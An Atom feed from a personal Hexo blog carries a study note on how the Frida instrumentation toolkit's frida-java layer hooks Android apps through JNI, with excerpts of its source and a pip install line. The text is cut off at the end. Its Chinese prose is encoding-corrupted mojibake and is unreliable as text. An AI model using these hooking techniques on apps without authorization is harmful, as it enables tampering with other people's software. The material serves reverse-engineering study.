<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zxk1ngğŸ“</title>
  
  
  <link href="https://zxk1ng.github.io/atom.xml" rel="self"/>
  
  <link href="https://zxk1ng.github.io/"/>
  <updated>2025-01-15T12:47:20.854Z</updated>
  <id>https://zxk1ng.github.io/</id>
  
  <author>
    <name>zxk1ng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>test</title>
    <link href="https://zxk1ng.github.io/posts/d87f7e0c.html"/>
    <id>https://zxk1ng.github.io/posts/d87f7e0c.html</id>
    <published>2025-01-15T12:08:29.000Z</published>
    <updated>2025-01-15T12:47:20.854Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/posts/d87f7e0c.htm/img.png" alt="å›¾ç‰‡"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/posts/d87f7e0c.htm/img.png&quot; alt=&quot;å›¾ç‰‡&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>fridaä¸Objection</title>
    <link href="https://zxk1ng.github.io/posts/b00b5fdb.html"/>
    <id>https://zxk1ng.github.io/posts/b00b5fdb.html</id>
    <published>2025-01-15T07:08:29.000Z</published>
    <updated>2025-01-15T07:18:07.678Z</updated>
    
    <content type="html"><![CDATA[<h1>frida</h1><p>fridaä¸€äº›APIä½¿ç”¨å‚è€ƒhttps://www.anquanke.com/post/id/195869#h3-20   å®˜æ–¹æ–‡æ¡£ï¼š<a href="http://frida.re">frida.re</a></p><h2 id="fridaçš„ä»£ç ç»“æ„">fridaçš„ä»£ç ç»“æ„</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">frida-coreï¼šfridaæ ¸å¿ƒåº“</span><br><span class="line">frida-gumï¼šinline-hookæ¡†æ¶</span><br><span class="line"></span><br><span class="line"><span class="keyword">bindingsï¼š</span></span><br><span class="line"><span class="keyword"></span>frida-pythonï¼špython</span><br><span class="line">frida-nodeï¼šNode.<span class="keyword">js</span></span><br><span class="line"><span class="keyword"></span>frida-qmlï¼šQml</span><br><span class="line">frida-<span class="keyword">swiftï¼šSwift</span></span><br><span class="line"><span class="keyword"></span>frida-toolsï¼šCLI tools</span><br><span class="line"><span class="symbol">capstone:</span><span class="keyword">instruction </span><span class="keyword">disammbler</span></span><br><span class="line"><span class="keyword"></span>gum-<span class="keyword">jsï¼šä¸º </span>frida-gum æä¾› <span class="keyword">JavaScript </span>è¯­è¨€çš„æ¥å£ã€‚</span><br></pre></td></tr></table></figure><h2 id="fridaå®ç°hookçš„åŸç†">fridaå®ç°hookçš„åŸç†</h2><p><a href="https://bbs.kanxue.com/thread-229215.htm">https://bbs.kanxue.com/thread-229215.htm</a></p><p><a href="https://bbs.kanxue.com/thread-273450.htm#msg_header_h2_2">https://bbs.kanxue.com/thread-273450.htm#msg_header_h2_2</a></p><p>frida-javaå®ç°äº†jsåˆ°javaä»£ç çš„å•å‘é€šé“ï¼Œå³å¯ä»¥é€šè¿‡frida-javaï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨jsä»£ç å®ç°ï¼šè°ƒç”¨javaæ–¹æ³•ï¼Œåˆ›å»ºjavaå¯¹è±¡ï¼Œå¯¹javaå‡½æ•°æ–¹æ³•è¿›è¡Œhookã€‚</p><p><strong>ä»ä¸¤ä¸ªæ–¹é¢æ¥è§£æfrida-javaæºç </strong></p><ul><li>frida-javaæ˜¯å¦‚ä½•è¿é€šåˆ°javaä¸–ç•Œçš„</li><li>frida-javaå¦‚ä½•å®ç°javaå±‚æ–¹æ³•hook</li></ul><h3 id="frida-javaæ˜¯å¦‚ä½•è¿é€šåˆ°javaä¸–ç•Œçš„">frida-javaæ˜¯å¦‚ä½•è¿é€šåˆ°javaä¸–ç•Œçš„</h3><ul><li>é€šè¿‡frida-gumæä¾›çš„jsæ¥å£æ“ä½œnativeä¸–ç•Œï¼Œç„¶åå†åŸºäºjniè¿é€šåˆ°javaä¸–ç•Œ<img src="/posts/b00b5fdb.htm/image-20241024145016576.png" alt="image-20241024145016576"></li></ul><p>ä¸»è¦æ­¥éª¤ï¼š</p><ol><li>é€šè¿‡frida-gumè¿æ¥nativeä¸–ç•Œï¼Œè·å¾—ä¸€äº›è™šæ‹Ÿæœºæ¥å£ï¼Œå¦‚JNI_GetCreatedJavaVMs</li><li>è·å¾—javaVM</li><li>è·å¾—JNIENv</li><li>è·å¾—javaç±»çš„classå¼•ç”¨</li><li>æ“ä½œè¯¥javaç±»ï¼Œå¦‚åˆ›å»ºå¯¹è±¡ï¼Œè°ƒç”¨æ–¹æ³•</li></ol><h4 id="è¿é€šnativeä¸–ç•Œ">è¿é€šnativeä¸–ç•Œ</h4><p>åˆ©ç”¨frida-gumä¸­æä¾›çš„Moudle,Memory,NativeFunctionæ¨¡å—å¯ä»¥å®ç°æŸ¥æ‰¾ã€è°ƒç”¨ã€hookå¯¼å‡ºå‡½æ•°ï¼›è¯»å†™ã€åˆ†é…å†…å­˜ç­‰æ“ä½œã€‚å¦‚ä¸‹é¢ä¾‹å­æ‰€ç¤º, å¯ä»¥åœ¨jsä»£ç ä¸­è°ƒç”¨nativeå‡½æ•°ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> friendlyFunctionName = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(friendlyFunctionPtr, <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> returnValue = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(sizeOfLargeObject);</span><br><span class="line"><span class="title function_">friendlyFunctionName</span>(returnValue, thisPtr);</span><br></pre></td></tr></table></figure><h4 id="è·å¾—JavaVM">è·å¾—JavaVM</h4><p>è¦ä½¿ç”¨JNIè¿é€šjavaä¸–ç•Œï¼Œé¦–å…ˆè¦è·å¾—JavaVMã€‚frida-javaé€šè¿‡è°ƒç”¨JNI_GetCreatedJavaVMsæ¥è·å–JavaVMï¼ŒDalvikè™šæ‹Ÿæœºå’ŒARTè™šæ‹Ÿæœºå‡å®ç°äº†è¯¥å‡½æ•°ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/android.js</span></span><br><span class="line"><span class="keyword">const</span> vms = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(pointerSize);</span><br><span class="line"><span class="keyword">const</span> vmCount = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(jsizeSize);</span><br><span class="line"><span class="title function_">checkJniResult</span>(<span class="string">&#x27;JNI_GetCreatedJavaVMs&#x27;</span>, temporaryApi.<span class="title function_">JNI_GetCreatedJavaVMs</span>(vms, <span class="number">1</span>, vmCount));</span><br><span class="line"><span class="keyword">if</span> (<span class="title class_">Memory</span>.<span class="title function_">readInt</span>(vmCount) === <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">temporaryApi.<span class="property">vm</span> = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vms);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è·å¾—çš„vmåªæ˜¯JavaVMçš„ä¸€ä¸ªæŒ‡é’ˆï¼Œåœ¨æ­¤åŸºç¡€ä¸Šfrida-javaè¿˜ä¼šæ„é€ ä¸€ä¸ªVMå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç›¸å½“äºåœ¨jså±‚å®ç°äº†ä¸€ä¸ªJavaVMçš„ä»£ç†å¯¹è±¡ï¼Œå°è£…äº†ä¸€äº›JavaVMçš„æ–¹æ³•ï¼Œå¦‚getEnvã€‚å…¶ä¸­vm.handleä¸­ä¿å­˜çš„æ˜¯åŸå§‹çš„JavaVMå¯¹è±¡ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/vm.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">VM</span> (<span class="params">api</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> handle = <span class="literal">null</span>;  <span class="comment">//ä¿å­˜JavaVMæŒ‡é’ˆ</span></span><br><span class="line">  <span class="keyword">let</span> attachCurrentThread = <span class="literal">null</span>;  <span class="comment">//å°è£…äº†JavaVM.AttachCurrentThread</span></span><br><span class="line">  <span class="keyword">let</span> detachCurrentThread = <span class="literal">null</span>;  <span class="comment">//å°è£…äº†JavaVM.DetachCurrentThread;</span></span><br><span class="line">  <span class="keyword">let</span> getEnv = <span class="literal">null</span>;  <span class="comment">//å°è£…äº†JavaVM.getEnv</span></span><br><span class="line">  <span class="keyword">const</span> attachedThreads = &#123;&#125;;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">initialize</span> (<span class="params"></span>) &#123;</span><br><span class="line">    handle = api.<span class="property">vm</span>;</span><br><span class="line">    <span class="comment">//è·å–JavaVMçš„è™šå‡½æ•°è¡¨</span></span><br><span class="line">    <span class="keyword">const</span> vtable = <span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(handle);</span><br><span class="line">    attachCurrentThread = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vtable.<span class="title function_">add</span>(<span class="number">4</span> * pointerSize)), <span class="string">&#x27;int32&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    detachCurrentThread = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vtable.<span class="title function_">add</span>(<span class="number">5</span> * pointerSize)), <span class="string">&#x27;int32&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    getEnv = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(vtable.<span class="title function_">add</span>(<span class="number">6</span> * pointerSize)), <span class="string">&#x27;int32&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int32&#x27;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VMçš„åˆå§‹åŒ–è¿‡ç¨‹ä¸ºé¦–å…ˆè·å–JavaVMçš„æŒ‡é’ˆï¼Œé€šè¿‡JNI_GetCreatedJavaVMsè°ƒç”¨ï¼‰ï¼Œç„¶åè¯»å–JavaVMçš„è™šå‡½æ•°è¡¨ï¼Œè·å¾—JavaVMçš„ä¸€äº›é‡è¦æ–¹æ³•ï¼Œå¹¶åœ¨jså±‚åŒ…è£…ä¸€å±‚ï¼Œè¿™æ ·å°±åœ¨jså±‚å®ç°äº†ä¸€ä¸ªJavaVMçš„ä»£ç†ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨VM.getEnvæ¥å®ç°nativeå±‚çš„JavaVM.getEnVè°ƒç”¨ã€‚</p><p>è·å–åˆ°JavaVMåï¼Œå°±å¯ä»¥é€šè¿‡å°†å½“å‰çº¿ç¨‹ä¸JavaVMç›¸å…³è”ï¼Œç„¶åå¾—åˆ°JNIEnvå¯¹è±¡ï¼Œè¿›è¡Œåç»­æ“ä½œã€‚ä¸Šè¿°å·¥ä½œç”±VM.performå®Œæˆï¼Œçœ‹ä¸‹VM.performæºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vm.js</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">tryGetEnv</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> envBuf = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(pointerSize);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="title function_">getEnv</span>(handle, envBuf, <span class="variable constant_">JNI_VERSION_1_6</span>);</span><br><span class="line">    <span class="keyword">if</span> (result !== <span class="variable constant_">JNI_OK</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Env</span>(<span class="title class_">Memory</span>.<span class="title function_">readPointer</span>(envBuf), <span class="variable language_">this</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">perform</span> = <span class="keyword">function</span> (<span class="params">fn</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> threadId = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//å°†å½“å‰çº¿ç¨‹é™„åŠ åˆ°JavaVMï¼Œè·å–JNIEnvå¯¹è±¡</span></span><br><span class="line">    <span class="keyword">let</span> env = <span class="variable language_">this</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">    <span class="keyword">const</span> alreadyAttached = env !== <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (!alreadyAttached) &#123;</span><br><span class="line">      env = <span class="variable language_">this</span>.<span class="title function_">attachCurrentThread</span>();</span><br><span class="line"> </span><br><span class="line">      threadId = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">      attachedThreads[threadId] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="title function_">fn</span>();  <span class="comment">//æ‰§è¡Œfn</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!alreadyAttached) &#123;</span><br><span class="line">        <span class="keyword">const</span> allowedToDetach = attachedThreads[threadId];</span><br><span class="line">        <span class="keyword">delete</span> attachedThreads[threadId];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (allowedToDetach) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">detachCurrentThread</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>å’ŒJavaVMä¸€æ ·ï¼Œfrida-javaä¹Ÿä¼šåœ¨jså±‚ä¸ºJNIEnvå»ºç«‹ä¸€ä¸ªä»£ç†ï¼Œå…·ä½“åœ¨env.jså®ç°</p><h4 id="è·å¾—Javaç±»çš„classå¼•ç”¨">è·å¾—Javaç±»çš„classå¼•ç”¨</h4><p>å’ŒJNIæ“ä½œæ–¹å¼ä¸€æ ·ï¼Œæˆ‘ä»¬åœ¨nativeå±‚è·å¾—äº†JNIEnvåï¼Œè¦æƒ³æ“ä½œjavaç±»ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨env-&gt;findClassæ¥è·å¾—javaç±»çš„classå¼•ç”¨ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå› ä¸ºfrida-javaæ‰€åœ¨çš„çº¿ç¨‹æ˜¯é€šè¿‡pthread_createåˆ›é€ çš„ï¼Œç„¶åé€šè¿‡AttachCurrentThreadè·å–çš„JNIEnvï¼Œæ­¤æ—¶FindClassåªä¼šä»ç³»ç»Ÿçš„classloaderå¼€å§‹æŸ¥æ‰¾ï¼Œæ‰€ä»¥appè‡ªèº«çš„ç±»æ˜¯æ— æ³•é€šè¿‡env-&gt;findClassæ¥è·å–ã€‚å› æ­¤éœ€è¦æ‰‹å·¥çš„è·å–åˆ°åŠ è½½è¯¥appçš„classloaderã€‚Java.performåœ¨è°ƒç”¨VM.performä¹‹å‰ä¼šå…ˆè·å–åŠ è½½è¯¥appçš„classloaderï¼Œå¹¶ä¿å­˜åˆ°classFactory.loaderã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">perform</span> = <span class="keyword">function</span> (<span class="params">fn</span>) &#123;</span><br><span class="line">    <span class="title function_">assertJavaApiIsAvailable</span>();</span><br><span class="line">      <span class="comment">//ç›®æ ‡è¿›ç¨‹ä¸æ˜¯appï¼Œå¹¶ä¸”classloaderå·²ç»åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">isAppProcess</span>() || classFactory.<span class="property">loader</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">      threadsInPerform++;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        vm.<span class="title function_">perform</span>(fn);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="keyword">throw</span> e; &#125;, <span class="number">0</span>);</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        threadsInPerform--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//ç¬¬ä¸€æ¬¡è°ƒç”¨java.performæ—¶ï¼Œä¼šå…ˆè·å–åŠ è½½è¯¥appçš„classloader</span></span><br><span class="line">      pending.<span class="title function_">push</span>(fn);</span><br><span class="line">      <span class="keyword">if</span> (pending.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        threadsInPerform++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          vm.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="title class_">ActivityThread</span> = classFactory.<span class="title function_">use</span>(<span class="string">&#x27;android.app.ActivityThread&#x27;</span>);</span><br><span class="line">            <span class="keyword">const</span> app = <span class="title class_">ActivityThread</span>.<span class="title function_">currentApplication</span>();</span><br><span class="line">            <span class="keyword">if</span> (app !== <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">//è·å–åˆ°åŠ è½½è¯¥appçš„classloader</span></span><br><span class="line">              classFactory.<span class="property">loader</span> = app.<span class="title function_">getClassLoader</span>();</span><br><span class="line">              <span class="title function_">performPending</span>(); <span class="comment">// already initialized, continue</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">const</span> m = <span class="title class_">ActivityThread</span>.<span class="property">getPackageInfoNoCheck</span>;</span><br><span class="line">              <span class="keyword">let</span> initialized = <span class="literal">false</span>;</span><br><span class="line">              m.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> apk = m.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">                <span class="keyword">if</span> (!initialized) &#123;</span><br><span class="line">                  initialized = <span class="literal">true</span>;</span><br><span class="line">                  classFactory.<span class="property">loader</span> = apk.<span class="title function_">getClassLoader</span>();</span><br><span class="line">                  <span class="title function_">performPending</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> apk;</span><br><span class="line">              &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          threadsInPerform--;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>frida-javaä½¿ç”¨Java.useæ¥è·å¾—javaç±»çš„classå¼•ç”¨ï¼ŒJava.use(className),è¿”å›javaç±»çš„ä¸€ä¸ªwrapper,åœ¨jsä¸–ç•Œé‡Œï¼Œç”¨è¯¥wrapperæ¥æ“ä½œå¯¹åº”çš„javaç±»ã€‚Java.useç›´æ¥è°ƒç”¨äº†classFactory.use,ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/class-factory.js</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">use</span> = <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> C = classes[className]; <span class="comment">//å…ˆä»ç¼“å­˜ä¸­æŸ¥æ‰¾</span></span><br><span class="line">    <span class="keyword">if</span> (!C) &#123;</span><br><span class="line">      <span class="keyword">const</span> env = vm.<span class="title function_">getEnv</span>();  <span class="comment">//è·å–jni_env, è°ƒç”¨nativeå±‚çš„JavaVm.GetEnv  </span></span><br><span class="line">      <span class="keyword">if</span> (loader !== <span class="literal">null</span>) &#123;  <span class="comment">//loaderå·²ç»åœ¨Java.performä¸­åˆå§‹åŒ–äº†</span></span><br><span class="line">        <span class="keyword">const</span> usedLoader = loader;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (cachedLoaderMethod === <span class="literal">null</span>) &#123;</span><br><span class="line">          cachedLoaderInvoke = env.<span class="title function_">vaMethod</span>(<span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">          cachedLoaderMethod = loader.<span class="property">loadClass</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">handle</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> getClassHandle = <span class="keyword">function</span> (<span class="params">env</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> classNameValue = env.<span class="title function_">newStringUtf</span>(className);</span><br><span class="line">          <span class="keyword">const</span> tid = <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>();</span><br><span class="line">          <span class="title function_">ignore</span>(tid);</span><br><span class="line">          <span class="keyword">try</span> &#123;       <span class="comment">//env.handle æŒ‡å‘jniå±‚çš„JNIEnv, åˆ©ç”¨jniè°ƒç”¨classloader.loadClass(className)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">cachedLoaderInvoke</span>(env.<span class="property">handle</span>, usedLoader.<span class="property">$handle</span>, cachedLoaderMethod, classNameValue);</span><br><span class="line">          &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title function_">unignore</span>(tid);</span><br><span class="line">            env.<span class="title function_">deleteLocalRef</span>(classNameValue);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//æ„å»ºå¯¹åº”javaç±»çš„wrapper</span></span><br><span class="line">        C = <span class="title function_">ensureClass</span>(getClassHandle, className);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å€ŸåŠ©äºè¯¥wrapperï¼Œå¯ä»¥å¯¹javaç±»è¿›è¡Œæ“ä½œï¼Œå¦‚è°ƒç”¨æ„é€ å‡½æ•°åˆ›å»ºå¯¹è±¡ã€‚è¯¥wrapperçš„åˆå§‹åŒ–è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib/class-factory.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initializeClass</span> (<span class="params"></span>) &#123;</span><br><span class="line">    klass.<span class="property">__name__</span> = name;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> ctor = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> getCtor = <span class="keyword">function</span> (<span class="params">type</span>) &#123;&#125;;</span><br><span class="line">    <span class="comment">//å®šä¹‰äº†ä¸€äº›æ¯ä¸ªç±»éƒ½å…¬æœ‰çš„å‡½æ•°å’Œå±æ€§</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$new&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$alloc&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$init&#x27;</span>, &#123;&#125;);</span><br><span class="line">    klass.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$dispose</span> = dispose;</span><br><span class="line">    klass.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$isSameObject</span> = <span class="keyword">function</span> (<span class="params">obj</span>) &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;class&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(klass.<span class="property"><span class="keyword">prototype</span></span>, <span class="string">&#x27;$className&#x27;</span>, &#123;&#125;);</span><br><span class="line">    <span class="comment">//æ·»åŠ è¯¥ç±»ç‰¹æœ‰çš„å‡½æ•°å’Œå±æ€§</span></span><br><span class="line">    <span class="title function_">addMethodsAndFields</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å€ŸåŠ©äºè¯¥wrapperçš„$initæ–¹æ³•ï¼Œå°±å¯ä»¥åˆ›å»ºjavaå¯¹è±¡ã€‚</p><h1>frida<strong>å®‰è£…</strong></h1><h2 id="fridaä¸frida-tools">fridaä¸frida-tools</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==<span class="number">14.2</span><span class="number">.18</span> frida-tools==<span class="number">9.2</span><span class="number">.5</span> -i https://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure><h2 